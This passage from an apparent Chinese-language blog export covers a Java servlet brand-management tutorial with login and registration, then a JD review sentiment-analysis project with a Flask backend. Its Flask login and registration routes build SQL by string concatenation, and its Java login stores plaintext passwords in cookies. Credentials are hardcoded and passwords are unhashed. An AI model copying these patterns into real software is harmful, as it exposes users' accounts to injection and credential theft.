mapper.selectByConditionsCount(brand); PageBean&lt;Brand&gt; pageBean = new PageBean&lt;&gt;(); pageBean.setRows(rows); pageBean.setTotalCount(totalCount); sqlSession.close(); return pageBean; &#125; servlet/** * 搜索 * @param request * @param response * @throws ServletException * @throws IOException */ public void search(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; // 1.获取当前页码和每页展示条数 url?currentpage=1&amp;pagesize=5 String _currentpage = request.getParameter(&quot;currentpage&quot;); String _pagesize = request.getParameter(&quot;pagesize&quot;); int currentpage = Integer.parseInt(_currentpage); int pagesize = Integer.parseInt(_pagesize); // 2.获取json字符串 BufferedReader reader = request.getReader(); String line = reader.readLine(); System.out.println(line); // 3.将json字符串转为brand对象 Brand brand = JSON.parseObject(line, Brand.class); System.out.println(brand); // 4.调用service方法 获取pageBean对象 PageBean&lt;Brand&gt; pageBean = service.selectByConditionsPage(brand, currentpage, pagesize); // 5.将PageBean转为Json字符串 String string = JSON.toJSONString(pageBean); // 6.发送响应数据 response.setContentType(&quot;text/json;charset=utf-8&quot;); response.getWriter().write(string); &#125; 前端实现获取查询条件查询表单绑定的模型为searchBrand &lt;el-form :inline=&quot;true&quot; :model=&quot;searchBrand&quot; class=&quot;demo-form-inline&quot;&gt; searchBrand数据如下 // 搜索数据 searchBrand:&#123; status: &#x27;&#x27;, brandName: &#x27;&#x27;, companyName: &#x27;&#x27;, id:&quot;&quot;, ordered:&quot;&quot;, description:&quot;&quot; &#125;, 当用户输入条件后，数据自动绑定到searchBrand模型上，向后台提交数据时，提交searchBrand即可 查询的异步请求search()&#123; var _this = this; axios(&#123; method: &#x27;POST&#x27;, url: &#x27;http://localhost:8080/brand-case/brand/search?currentpage=&#x27;+ _this.currentPage + &#x27;&amp;pagesize=&#x27; + _this.pageSize, data: this.searchBrand &#125;).then(function(response)&#123; // 获取数据 &#123;rows: &#123; &#125; &#125; // 设置表格数据 _this.brandlist = response.data.rows; // 设置总记录数 _this.totalCount = response.data.totalCount; _this.currentPage = 1; &#125;) &#125; 6.删除单条数据需求分析 删除单条数据时需要携带该数据的id，使用get请求既可 获取id，可以使用scope.row.id 后端实现dao/** * 删除指定商品 * @param id */ @Delete(&quot;delete from tb_brand where id = #&#123;id&#125;&quot;) void deleteById(@Param(&quot;id&quot;) int id); service/** * 删除指定数据 * @param id */ public void deleteById(int id)&#123; SqlSession sqlSession = sqlSessionFactory.openSession(); BrandMapper mapper = sqlSession.getMapper(BrandMapper.class); mapper.deleteById(id); sqlSession.commit(); sqlSession.close(); &#125; servlet/** * 删除指定数据 * @param request * @param response * @throws ServletException * @throws IOException */ public void deleteById(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; String _id = request.getParameter(&quot;id&quot;); int id = Integer.parseInt(_id); service.deleteById(id); response.getWriter().write(&quot;success&quot;); &#125; 前端实现获取id参考 在修改和删除按钮位置添加slot-scope=&quot;scope&quot; &lt;el-row slot-scope=&quot;scope&quot;&gt; &lt;el-button type=&quot;primary&quot; @click=&quot;update(scope.row)&quot; &gt;修改&lt;/el-button&gt; &lt;el-button type=&quot;danger&quot; @click=&quot;deleteById(scope.row.id)&quot; &gt;删除&lt;/el-button&gt; &lt;/el-row&gt; 使用scope.row.id即可获取到每行数据的id 异步请求同样使用confirm组件提示用户是否真的想删除 deleteById(id)&#123; this.$confirm(&#x27;确定删除吗？&#x27;, &#x27;确认信息&#x27;, &#123; distinguishCancelAndClose: true, confirmButtonText: &#x27;确定&#x27;, cancelButtonText: &#x27;取消&#x27; &#125;).then(() =&gt; &#123; this.currentPage=1 var _this = this; var deleteId = id; axios(&#123; method: &#x27;get&#x27;, url: &#x27;http://localhost:8080/brand-case/brand/deleteById?id=&#x27;+deleteId, &#125;).then(function(response)&#123; if(response.data == &quot;success&quot;)&#123; // 重新查询数据 _this.selectAll(); //显示提示框 _this.$message(&#123; type: &#x27;success&#x27;, message: &#x27;删除成功&#x27; &#125;); &#125; &#125;) &#125;).catch(() =&gt; &#123; this.$message(&#123; type: &#x27;info&#x27;, message: &quot;取消删除&quot; &#125;) &#125;) &#125;, 7.修改需求分析 修改与添加类似，需要弹出对话框后进行数据的编辑 如何获取每行的数据，使用scope.row即可 请求数据为json数据，后台接收后将其转换为Brand类型后进行更新操作 后端实现dao/** * 更新数据 * @param brand */ @Update(&quot;update tb_brand set brand_name = #&#123;brandName&#125;,company_name = #&#123;companyName&#125;,ordered = #&#123;ordered&#125;,description = #&#123;description&#125;,status = #&#123;status&#125; where id = #&#123;id&#125;&quot;) @ResultMap(&quot;brandResultMap&quot;) void update(Brand brand); service/** * 更新数据 * @param brand */ public void update(Brand brand)&#123; SqlSession sqlSession = sqlSessionFactory.openSession(); BrandMapper mapper = sqlSession.getMapper(BrandMapper.class); mapper.update(brand); sqlSession.commit(); sqlSession.close(); &#125; servlet/** * 更新 * @param request * @param response * @throws ServletException * @throws IOException */ public void update(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; BufferedReader reader = request.getReader(); String line = reader.readLine(); System.out.println(line); Brand brand = JSON.parseObject(line, Brand.class); System.out.println(brand); service.update(brand); response.getWriter().write(&quot;success&quot;); &#125; 前端实现修改对话框该对话框与增加对话的实现相同，不过该对话框初始时需要显示数据 &lt;el-button type=&quot;primary&quot; @click=&quot;update(scope.row)&quot; &gt;修改&lt;/el-button&gt; update函数的实现 update(data)&#123; var _this = this; this.dialogUpdateVisible = true; this.updateBrand.brandName = data.brandName; this.updateBrand.companyName = data.companyName; this.updateBrand.status = data.status; this.updateBrand.ordered = data.ordered; this.updateBrand.description = data.description; this.updateBrand.statusStr = data.statusStr; &#125;, updateBrand定义 data() &#123; return &#123; //带修改的数据 updateBrand:&#123; &quot;brandName&quot;: &quot;&quot;, &quot;companyName&quot;: &quot;&quot;, &quot;description&quot;: &quot;&quot;, &quot;id&quot;: 1, &quot;ordered&quot;: 0, &quot;status&quot;: 0, &quot;statusStr&quot;: &quot;&quot; &#125;, &#125; 异步请求实现修改对话框的提交按钮位置 &lt;el-form-item&gt; &lt;el-button type=&quot;primary&quot; @click=&quot;updateSubmit&quot;&gt;提交&lt;/el-button&gt; &lt;!--取消 只需要将dialogVisble设置为false即可隐藏对话框--&gt; &lt;el-button @click=&quot;dialogUpdateVisible = false&quot;&gt;取消&lt;/el-button&gt; &lt;/el-form-item&gt; // 修改 updateSubmit()&#123; var _this = this; axios(&#123; method:&#x27;POST&#x27;, url: &#x27;http://localhost:8080/brand-case/brand/update&#x27;, data: _this.updateBrand &#125;).then(function(response)&#123; if(response.data == &quot;success&quot;)&#123; _this.dialogUpdateVisible = false; _this.selectAll(); _this.msgbox(&quot;修改成功！&quot;); &#125; &#125;) &#125;, 登录注册功能实现登录功能后端实现dao在src/main/java/com/itheima/mapper创建UserMapper接口 package com.itheima.mapper; import com.itheima.pojo.User; import org.apache.ibatis.annotations.Insert; import org.apache.ibatis.annotations.Param; import org.apache.ibatis.annotations.Select; public interface UserMapper &#123; /** * 用户登录 * 检查用户名和密码是否正确 * @param username * @param password * @return */ @Select(&quot;select * from tb_user where username = #&#123;username&#125; and password = #&#123;password&#125;&quot;) User select(@Param(&quot;username&quot;) String username, @Param(&quot;password&quot;) String password); &#125; service在src/main/java/com/itheima/service中创建UserService类 SqlSessionFactory sqlSessionFactory = SqlSessionFactoryUtils.getSqlSessionFactory(); /** * 用户登录方法 * @param username * @param password * @return */ public User Login(String username, String password)&#123; SqlSession session = sqlSessionFactory.openSession(); UserMapper mapper = session.getMapper(UserMapper.class); User user = mapper.select(username, password); if(user != null)&#123; return user; &#125;else &#123; return null; &#125; &#125; servlet在src/main/java/com/itheima/servler/web中创建LoginServlet package com.itheima.web.servlet; import com.itheima.pojo.User; import com.itheima.service.UserService; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.*; import java.io.IOException; @WebServlet(value = &quot;/login&quot;) public class LoginServlet extends HttpServlet &#123; // 因为BrandService可能多次用到 所以变成成员变量 减少创建的次数 UserService userservice = new UserService(); @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; System.out.println(&quot;login&quot;); //解决POST请求中文乱码问题 request.setCharacterEncoding(&quot;UTF-8&quot;); String username = request.getParameter(&quot;username&quot;); String password = request.getParameter(&quot;password&quot;); User user = userservice.Login(username, password); if(user != null)&#123; // 登录成功，页面跳转到了 brand.jsp // 保存用户的session信息 // 检查是否勾选记住密码 String remember = request.getParameter(&quot;remember&quot;); if(&quot;1&quot;.equals(remember))&#123; Cookie c_username = new Cookie(&quot;username&quot;, username); Cookie c_password = new Cookie(&quot;password&quot;, password); c_username.setMaxAge(3600*24*7); c_password.setMaxAge(3600*24*7); // 发送Cookie response.addCookie(c_username); response.addCookie(c_password); &#125; HttpSession session = request.getSession(); session.setAttribute(&quot;user&quot;, user); // 获取项目的虚拟路径 String contextPath = request.getContextPath(); request.getRequestDispatcher( &quot;/brand.html&quot;).forward(request,response); &#125;else &#123; // 登录失败，在页面显示登录失败的提示信息 request.setAttribute(&quot;login_msg&quot;,&quot;用户名或密码错误&quot;); request.getRequestDispatcher(&quot;/login.jsp&quot;).forward(request,response); &#125; &#125; @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; doGet(request, response); &#125; &#125; 前端实现&lt;div id=&quot;loginDiv&quot; style=&quot;height: 350px&quot;&gt; &lt;form action=&quot;/brand-case/login&quot; method=&quot;post&quot;id=&quot;form&quot;&gt; &lt;h1 id=&quot;loginMsg&quot;&gt;LOGIN IN&lt;/h1&gt; &lt;div id=&quot;errorMsg&quot;&gt;$&#123;login_msg&#125; $&#123;register_msg&#125;&lt;/div&gt; &lt;p&gt;Username:&lt;input id=&quot;username&quot; name=&quot;username&quot; value=&quot;$&#123;cookie.username.value&#125;&quot; type=&quot;text&quot;&gt;&lt;/p&gt; &lt;p&gt;Password:&lt;input id=&quot;password&quot; name=&quot;password&quot; value=&quot;$&#123;cookie.password.value&#125;&quot;type=&quot;password&quot;&gt;&lt;/p&gt; &lt;p&gt;Remember:&lt;input id=&quot;remember&quot; name=&quot;remember&quot; value=&quot;1&quot; type=&quot;checkbox&quot;&gt;&lt;/p&gt; &lt;div id=&quot;subDiv&quot;&gt; &lt;input type=&quot;submit&quot; class=&quot;button&quot; value=&quot;login up&quot;&gt; &lt;input type=&quot;reset&quot; class=&quot;button&quot; value=&quot;reset&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a href=&quot;register.jsp&quot;&gt;没有账号？&lt;/a&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; 注册功能后端实现dao/** * 查询是否存在相同的用户名 * @param username * @return */ @Select(&quot;select * from tb_user where username = #&#123;username&#125;&quot;) User selectUser(@Param(&quot;username&quot;) String username); /** * 用户注册 * @param user */ @Insert(&quot;insert into tb_user values (null, #&#123;username&#125;, #&#123;password&#125;)&quot;) void addUser(User user); service/** * 注册功能 * @param user * @return */ public boolean Register(User user)&#123; SqlSession session = sqlSessionFactory.openSession(); UserMapper mapper = session.getMapper(UserMapper.class); User u = mapper.selectUser(user.getUsername()); if(u == null)&#123; mapper.addUser(user); session.commit(); &#125; session.commit(); return u == null; &#125; servletpackage com.itheima.web.servlet; import com.itheima.pojo.User; import com.itheima.service.UserService; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; @WebServlet(value = &quot;/register&quot;) public class RegisterServlet extends HttpServlet &#123; // 因为UserService可能多次用到 所以变成成员变量 减少创建的次数 UserService userservice = new UserService(); @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; //解决POST请求中文乱码问题 request.setCharacterEncoding(&quot;UTF-8&quot;); String username = request.getParameter(&quot;username&quot;); String password = request.getParameter(&quot;password&quot;); String checkCode1 = request.getParameter(&quot;checkCode&quot;); User user = new User(); user.setUsername(username); user.setPassword(password); // 获取生成的验证码信息 HttpSession session = request.getSession(); String checkCode =(String) session.getAttribute(&quot;checkCode&quot;); // 比较用户输入的验证码 // 细节：checkCode为程序中定义的变量 比较时放在前面，否则可能出现空指针错误 if(!checkCode.equals(checkCode1))&#123; request.setAttribute(&quot;register_msg&quot;, &quot;验证码错误，请重新输入！&quot;); request.getRequestDispatcher(&quot;/register.jsp&quot;).forward(request,response); // 禁止注册 return ; &#125; boolean flag = userservice.Register(user); if(flag)&#123; request.setAttribute(&quot;register_msg&quot;,&quot;注册成功，请登录！&quot;); request.getRequestDispatcher(&quot;/login.jsp&quot;).forward(request,response); &#125;else&#123; request.setAttribute(&quot;register_msg&quot;,&quot;注册成功，请重试！&quot;); request.getRequestDispatcher(&quot;/regsiter.jsp&quot;).forward(request,response); &#125; &#125; @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; doGet(request, response); &#125; &#125; 前端实现&lt;div class=&quot;form-div&quot;&gt; &lt;div class=&quot;reg-content&quot;&gt; &lt;h1&gt;欢迎注册&lt;/h1&gt; &lt;span&gt;已有帐号？&lt;/span&gt; &lt;a href=&quot;login.jsp&quot;&gt;登录&lt;/a&gt; &lt;/div&gt; &lt;form id=&quot;reg-form&quot; action=&quot;/register&quot; method=&quot;post&quot;&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;用户名&lt;/td&gt; &lt;td class=&quot;inputs&quot;&gt; &lt;input name=&quot;username&quot; type=&quot;text&quot; id=&quot;username&quot;&gt; &lt;br&gt; &lt;span id=&quot;username_err&quot; class=&quot;err_msg&quot;&gt;$&#123;register_msg&#125;&lt;/span&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;密码&lt;/td&gt; &lt;td class=&quot;inputs&quot;&gt; &lt;input name=&quot;password&quot; type=&quot;password&quot; id=&quot;password&quot;&gt; &lt;br&gt; &lt;span id=&quot;password_err&quot; class=&quot;err_msg&quot; style=&quot;display: none&quot;&gt;密码格式有误&lt;/span&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;验证码&lt;/td&gt; &lt;td class=&quot;inputs&quot;&gt; &lt;input name=&quot;checkCode&quot; type=&quot;text&quot; id=&quot;checkCode&quot;&gt; &lt;img id=&quot;checkCodeImg&quot; src=&quot;/checkCode&quot;&gt; &lt;a href=&quot;#&quot; id=&quot;changeImg&quot;&gt;看不清？&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;div class=&quot;buttons&quot;&gt; &lt;input value=&quot;注 册&quot; type=&quot;submit&quot; id=&quot;reg_btn&quot;&gt; &lt;/div&gt; &lt;br class=&quot;clear&quot;&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;script&gt; document.getElementById(&quot;changeImgg&quot;).onclick = function() &#123; //路径后面添加时间戳的目的是避免浏览器进行缓存静态资源 document.getElementById(&quot;checkCodeImg&quot;).src = &quot;/checkCode?&quot;+new Date().getMilliseconds(); &#125; &lt;/script&gt; 验证码模块借助验证码生成工具 在src/main/java/com/itheima/util引入生成验证码的类 将验证码显示在页面上 在src/main/java/com/itheima/servler/web创建CheckCodeServlet package com.itheima.web.servlet; import com.itheima.service.BrandService; import com.itheima.util.CheckCodeUtil; import javax.servlet.ServletException; import javax.servlet.ServletOutputStream; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; @WebServlet(value = &quot;/checkCode&quot;) public class CheckCodeServlet extends HttpServlet &#123; // 因为BrandService可能多次用到 所以变成成员变量 减少创建的次数 private BrandService brandService = new BrandService(); @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; // 生成验证码 // 获取响应输出流 ServletOutputStream os = response.getOutputStream(); // 生成验证码图片显示在jsp页面上 String checkCode = CheckCodeUtil.outputVerifyImage(100, 50, os, 4); // 将生成的验证码信息发送到 /register 用于验证用户输入的验证码是否正确 // 将验证码存入session HttpSession codeSession = request.getSession(); codeSession.setAttribute(&quot;checkCode&quot;, checkCode); &#125; @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; doGet(request, response); &#125; &#125; 权限验证使用javaweb的三大组件 filer实现 在src/main/java/com/itheima/servler/web/filter中创建LoginFilter package com.sunzy.web.filter; import javax.servlet.*; import javax.servlet.annotation.WebFilter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpSession; import java.io.IOException; //@WebFilter(&quot;/*&quot;) public class LoginFilter implements Filter &#123; public void init(FilterConfig config) throws ServletException &#123; &#125; public void destroy() &#123; &#125; @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException &#123; // 放行登录相关的资源 String urls[] = &#123;&quot;/login.jsp&quot;, &quot;/css/&quot;, &quot;/imgs/&quot;, &quot;register.jsp&quot;,&quot;/checkCode&quot;,&quot;/register&quot;,&quot;/login&quot;&#125;; HttpServletRequest req = (HttpServletRequest) request; StringBuffer requestURL = req.getRequestURL(); String url = requestURL.toString(); for(String u :urls )&#123; if(url.contains(u))&#123; chain.doFilter(request,response); return ; &#125; &#125; HttpSession session = req.getSession(); Object user = session.getAttribute(&quot;user&quot;); if(user != null)&#123; chain.doFilter(request, response); &#125;else &#123; request.setAttribute(&quot;login_msg&quot;, &quot;您尚未登录！&quot;); request.getRequestDispatcher(&quot;/login.jsp&quot;).forward(req, response); &#125; &#125; &#125;","tags":[{"name":"mybatis","slug":"mybatis","permalink":"https://sunzhengyu99.github.io/tags/mybatis/"},{"name":"servlet","slug":"servlet","permalink":"https://sunzhengyu99.github.io/tags/servlet/"}]},{"title":"商品评价情感分析","date":"2021-08-06T07:26:13.000Z","path":"2021/08/06/maliciousUrls/","text":"项目综述 对给定的文本进行自动分类，对评价分成好评和差评 支持批量检测，并进行可视化展示 对所有评价进行词云展示 数据获取爬虫获取JD的商品评价，这里主要针对智能手机的评价 首先是分析如何获取到商品的评价 对商品评价进行提取 对获取的数据进行分类保存 获取评价首先进行搜索，比如关键词 为手机 self.startUrl = &quot;https://search.jd.com/Search?keyword=%s&amp;enc=utf-8&quot; % (quote(&#x27;手机&#x27;)) # jD起始搜索页面 之后获取商品的ID，可以在网页源码中提取//li[@class=&quot;gl-item&quot;]/@data-sku，具体的节点信息如下 获得商品ID后可以利用JD提供的评价API获取评论页面，如图 api接口如下 https://sclub.jd.com/comment/productPageComments.action?productId=100020210392&amp;score=3&amp;sortType=5&amp;page=2&amp;pageSize=10&amp;isShadowSku=0&amp;rid=0&amp;fold=1 其中需要改变的参数为 productId 商品ID score 评论的分类 1为差评 2为中评 3为好评 page 评论的页数 获取这个页面后就是对数据进行提取 数据提取 这里为了方便，先将提取到的数据保存在csv文件中，之后再写入到数据库中 上图中我们需要提取的数据只有评价部分的内容和打分数，也就是，content和socore的数据 这里可以将网页数据转换成json数据后提取，很方便 res_json = json.loads(response.text) for cdit in res_json[&#x27;comments&#x27;]: # comment = cdit[&#x27;content &#x27;].replace(&quot;\\n&quot;, &#x27; &#x27;) comment = cdit[&#x27;content&#x27;].replace(&quot;\\n&quot;, &#x27; &#x27;).replace(&#x27;\\r&#x27;, &#x27; &#x27;) comments.append(comment) scores.append(cdit[&#x27;score&#x27;]) print(comment) 数据保存savepath = &#x27;./&#x27; + self.categlory + &#x27;_&#x27; + self.comtype[score] + &#x27;.csv&#x27; logging.warning(&quot;已爬取%d 条 %s 评价信息&quot; % (len(comments), self.comtype[score])) with open(savepath, &#x27;a+&#x27;, encoding=&#x27;utf8&#x27;) as f: for i in range(len(comments)): f.write(&quot;%d\\t%s\\t%s\\n&quot; % (i, scores[i], comments[i])) logging.warning(&quot;数据已保存在 %s&quot; % (savepath)) 贝叶斯分类 1.加载语料，打乱语料顺序，将语料分为评论和好评/差评2.去除评论中的英文、停用词3.将全部语料按1:4分为测试集与训练集4.使用CountVectorize构造词袋模型5.使用TfidfTransformer计算tf-idf值作为特征 6.选择多个分类器进行分类(也可以只用一个，这里只用了多项式)7.选择合适的模型并保存 加载语料def load_corpus(file_path_pos,file_path_nag): with open(file_path_pos, &#x27;r&#x27;,encoding=&#x27;UTF-8&#x27;) as f: reader = csv.reader(f) rows = [row for row in reader] with open(file_path_nag, &#x27;r&#x27;,encoding=&#x27;UTF-8&#x27;) as f: reader = csv.reader(f) rows_2 = [row for row in reader] rows.extend(rows_2) # 将读取出来的语料转为list review_data = np.array(rows).tolist() # 打乱语料的顺序 random.shuffle(review_data) review_list = [] sentiment_list = [] # 第一列为差评/好评， 第二列为评论 for words in review_data: review_list.append(words[0].split(&quot;\\t&quot;)[2]) if(words[0].split(&quot;\\t&quot;)[1][0] == &#x27;5&#x27;): sentiment_list.append(1) else: sentiment_list.append(0) return review_list, sentiment_list 生成的数据如下 去除评论中的英文、停用词这一步的目的是方便后面的词频统计 def load_stopwords(file_path): # 加载停顿词 stop_words = [] with open(file_path, encoding=&#x27;UTF-8&#x27;) as words: stop_words.extend([i.strip() for i in words.readlines()]) return stop_words def review_to_text(review): stop_words = load_stopwords(stopword_path) # 去除英文 review = re.sub(&quot;[^\\u4e00-\\u9fa5^a-z^A-Z]&quot;, &#x27;&#x27;, review) # print(review) review = jieba.cut(review) # 去掉停用词，将句子划分成一个个的单词 例如：[&#x27;赞赞赞&#x27;, &#x27;不错&#x27;, &#x27;很漂亮&#x27;, &#x27;外壳&#x27;] words = [] if stop_words: all_stop_words = set(stop_words) words = [w for w in review if w not in all_stop_words] print(words[:4]) return words 最后经过处理 review_train = [&#x27; &#x27;.join(review_to_text(review)) for review in train_review_list] review_test = [&#x27; &#x27;.join(review_to_text(review)) for review in test_review_list] 呈现如下的效果 训练模型# 加载语料 review_list, sentiment_list = load_corpus(file_path_pos,file_path_nag) # 将全部语料按1:4分为测试集与训练集 n = len(review_list) // 5 train_review_list, train_sentiment_list = review_list[n:], sentiment_list[n:] test_review_list, test_sentiment_list = review_list[:n], sentiment_list[:n] print(&#x27;训练集数量： &#123;&#125;&#x27;.format(str(len(train_review_list)))) print(&#x27;测试集数量： &#123;&#125;&#x27;.format(str(len(test_review_list)))) # 用于训练的评论 review_train = [&#x27; &#x27;.join(review_to_text(review)) for review in train_review_list] # 将句子中的单词重新拼接，形成无停顿词的句子 # 对于训练评论对应的好评/差评 sentiment_train = train_sentiment_list # 用于测试的评论 review_test = [&#x27; &#x27;.join(review_to_text(review)) for review in test_review_list] print(review_test[:3]) # 对于测试评论对应的好评/差评 sentiment_test = test_sentiment_list vectorizer = CountVectorizer(max_df=0.8, min_df=3) tfidftransformer = TfidfTransformer() # 先转换成词频矩阵，再计算TFIDF值 tfidf = tfidftransformer.fit_transform(vectorizer.fit_transform(review_train)) # 朴素贝叶斯中的多项式分类器，训练模型 clf = MultinomialNB().fit(tfidf, sentiment_train) # 将模型保存pickle文件 with open(model_export_path, &#x27;wb&#x27;) as file: d = &#123; &quot;clf&quot;: clf, &quot;vectorizer&quot;: vectorizer, &quot;tfidftransformer&quot;: tfidftransformer, &#125; pickle.dump(d, file) print(&quot;训练完成&quot;) 使用测试数据集验证该模型的准确性 count_vec = CountVectorizer(max_df=0.8, min_df=3) tfidf_vec = TfidfTransformer() # 定义Pipeline对全部步骤的流式化封装和管理，可以很方便地使参数集在新数据集（比如测试集）上被重复使用。 def MNB_Classifier(): return Pipeline([ (&#x27;count_vec&#x27;, count_vec), (&#x27;tfidf_vec&#x27;, tfidf_vec), (&#x27;mnb&#x27;, MultinomialNB()) ]) mnbc_clf = MNB_Classifier() # 进行训练 mnbc_clf.fit(review_train, sentiment_train) # 测试集准确率 print(&#x27;测试集准确率： &#123;&#125;&#x27;.format(mnbc_clf.score(review_test, sentiment_test))) 准确性可以达到88%，是一个不错的结果 可视化网页数据库将爬取的评论写入数据库，将网页中输入的检测数据和结果写入数据库，以及用户登录账号密码 所以需要三个数据表保存上面提到的三种数据 这里使用脚本一键完成 # -*- coding = utf - 8 -*- #@Time : 2021/8/6 22:35 #@Author : sunzy #@File : db_helper.py import re import csv import random import pymysql conn = pymysql.connect(host=&#x27;127.0.0.1&#x27;, user=&#x27;root&#x27;, password=&#x27;root&#x27;, port=3306, db=&#x27;goods&#x27;, charset=&#x27;utf8mb4&#x27;) def createTable(): sql = &quot;create table comment(id int primary key auto_increment,comment varchar(800) CHARACTER SET &#x27;utf8&#x27;,type varchar(200) CHARACTER SET &#x27;utf8&#x27;)&quot; cur = conn.cursor() cur.execute(sql) cur.close() def createTable1(): sql = &quot;create table user(id int primary key auto_increment,username varchar(80),password varchar(200))&quot; cur = conn.cursor() cur.execute(sql) cur.close() def createTable2(): sql = &quot;create table result(id int primary key auto_increment,comment varchar(800) CHARACTER SET &#x27;utf8&#x27;,type varchar(200) CHARACTER SET &#x27;utf8&#x27;)&quot; cur = conn.cursor() cur.execute(sql) cur.close() createTable() createTable1() createTable2() with open(&#x27;手机_nagetive.csv&#x27;, &#x27;r&#x27;, encoding=&#x27;UTF-8&#x27;) as f: reader = csv.reader(f) for row in reader: r = &#x27;&#x27;.join(row) cursor = conn.cursor() cursor.execute(&quot;insert into `comment` values(null, %s, &#x27;差评&#x27;)&quot;, (r.split()[2])); conn.commit() cursor.close() with open(&#x27;手机_positive.csv&#x27;, &#x27;r&#x27;, encoding=&#x27;UTF-8&#x27;) as f: reader = csv.reader(f) for row in reader: r = &#x27;&#x27;.join(row) cursor = conn.cursor() cursor.execute(&quot;insert into `comment` values(null, %s, &#x27;好评&#x27;)&quot;, (r.split()[2])); conn.commit() cursor.close() 用户注册和登录用户的注册和登录逻辑很简单，就是与数据库进行交互 @app.route(&#x27;/addUser&#x27;,methods=[&#x27;POST&#x27;]) def addUser(): get_json = request.get_json() name = get_json[&#x27;name&#x27;] password = get_json[&#x27;password&#x27;] conn = pymysql.connect(host=&#x27;127.0.0.1&#x27;, user=&#x27;root&#x27;, password=&#x27;root&#x27;, port=3306, db=&#x27;goods&#x27;, charset=&#x27;utf8mb4&#x27;) cursor = conn.cursor() sql = &quot;insert into `user` values(null,&#x27;&quot;+name+&quot;&#x27;,&#x27;&quot;+password+&quot;&#x27;,&#x27;user&#x27;)&quot; cursor.execute(sql); conn.commit() table_result = &#123;&quot;code&quot;: 200, &quot;msg&quot;: &quot;成功&quot;&#125; cursor.close() conn.close() return jsonify(table_result) @app.route(&#x27;/loginByPassword&#x27;,methods=[&#x27;POST&#x27;]) def loginByPassword(): get_json = request.get_json() name = get_json[&#x27;name&#x27;] password = get_json[&#x27;password&#x27;] conn = pymysql.connect(host=&#x27;127.0.0.1&#x27;, user=&#x27;root&#x27;, password=&#x27;root&#x27;, port=3306, db=&#x27;goods&#x27;, charset=&#x27;utf8mb4&#x27;) cursor = conn.cursor() cursor.execute(&quot;select count(*) from `user` where `username` = &#x27;&quot; + name +&quot;&#x27; and password = &#x27;&quot; + password+&quot;&#x27;&quot;); count = cursor.fetchall() if(count[0][0] != 0): table_result = &#123;&quot;code&quot;: 200, &quot;msg&quot;: name&#125; else: table_result = &#123;&quot;code&quot;: 500, &quot;msg&quot;: &quot;失败&quot;&#125; cursor.close() conn.close() return jsonify(table_result) 用户成功登录后，js脚本会重定向到index.html页面，进入系统主页 form.on(&#x27;submit(login-submit)&#x27;, function (obj) &#123; $.ajax(&#123; type: &quot;post&quot;, contentType: &#x27;application/json&#x27;, url: &quot;http://127.0.0.1:5000/loginByPassword&quot;, data: JSON.stringify(obj.field), dataType: &#x27;json&#x27;, success: function (data) &#123; if (data.code == &#x27;200&#x27;) &#123; layer.msg(&#x27;登录成功&#x27;, &#123; icon: 1, time: 1500 &#125;, function () &#123; location.replace(&#x27;../../index.html&#x27;) //重定向到index.html &#125;) &#125; else &#123; layer.alert(data.msg, &#123;icon: 2&#125;, function (index) &#123; layer.close(index); &#125;); &#125; &#125; &#125;) return false; &#125;); 词云展示使用echarts生成词云 @app.route(&#x27;/top&#x27;,methods=[&#x27;GET&#x27;]) def top(): jsondata = &#123;&#125; if(len(request.args)!=0): if(request.args[&#x27;category&#x27;]==&#x27;good&#x27;): jsondata[&#x27;data&#x27;] = good_datas else: jsondata[&#x27;data&#x27;] = bad_datas else: jsondata[&#x27;data&#x27;] = all_datas j = jsonify(jsondata) print(j) return j 数据获取 cursor.execute(&quot;select comment from `comment`&quot;); data_dict = [] result = cursor.fetchall() for field in result: data_dict.append(field[&#x27;comment&#x27;]) content = &#x27;&#x27;.join(data_dict) all_datas = [] jieba.analyse.set_stop_words(&#x27;./stopwords.txt&#x27;) tags = jieba.analyse.extract_tags(content, topK=100, withWeight=True) for v, n in tags: mydict = &#123;&#125; mydict[&quot;name&quot;] = v mydict[&quot;value&quot;] = str(int(n * 10000)) all_datas.append(mydict) cursor.close() js脚本 function init() &#123; form.render(); $.ajax(&#123; type: &#x27;GET&#x27;, url: &#x27;http://127.0.0.1:5000/top&#x27;, beforeSend: function(XMLHttpRequest) &#123; //注意，layer.msg默认3秒自动关闭，如果数据加载耗时比较长，需要设置time loadingFlag = layer.msg(&#x27;正在读取数据，请稍候……&#x27;, &#123; icon: 16, shade: 0.01, shadeClose: false, time: 60000 &#125;); &#125;, success: function(res) &#123; console.log(&#x27;初始化&#x27;) layer.close(loadingFlag); myCharts2.setOption(&#123; tooltip: &#123; show: true &#125;, series: [&#123; type: &quot;wordCloud&quot;, gridSize: 6, shape: &#x27;diamond&#x27;, sizeRange: [12, 50], width: 800, height: 500, textStyle: &#123; normal: &#123; color: function() &#123; return &#x27;rgb(&#x27; + [ Math.round(Math.random() * 160), Math.round(Math.random() * 160), Math.round(Math.random() * 